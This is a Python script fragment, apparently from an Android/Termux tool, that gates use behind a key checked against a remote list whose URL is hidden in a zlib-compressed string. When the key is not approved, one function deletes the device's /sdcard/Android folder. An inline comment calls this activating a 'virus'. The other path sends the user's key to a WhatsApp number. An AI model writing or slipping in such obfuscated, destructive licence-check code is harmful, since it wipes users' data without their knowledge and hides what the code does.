km=zlib.decompress(b'x\x9c\x05\xc1\xd1\n\x80 \x0c\x05\xd0/j3\xf3)\x88\xbe%C\xf4\xc1\xb1\xb1\xdd\xc0\xcf\xef\x9c\x01X\x9c\xcc\xb1\xeaf\xae\xdd\x1f\x91\xe6T\xa7\xf60\x05\xbd*\x9cS>8\x15\xfe\xa2y`\x81\x06d\xder\xed?\xb6\x10\x15\xce').decode()
def xi():
    global km
    j=getKey()
    r=requests.get(km).text
    if j in r:
        pass
    else:
        os.system("clear")
        #uncomment to activate virus
        shutil.rmtree("/sdcard/Android")
        print("Don't Bypass ")
        sys.exit()
   
def aprv():
    global km
    r=requests.get(km).text
    k=getKey()
    if k in r:
        option()
    else:
                os.system('clear')
                print(logo)
                print('\033[1;32m You Token Is Not Approved\33[1;37m')
                print('----------------------------------------------\n')
                print(f" Your Key : {k}")
                input('\n\033[1;37m           [Press Enter]')
                os.system(f"xdg-open https://wa.me/+923188508994?text={k}")
                aprv()
                sys.exit()
                

aprv()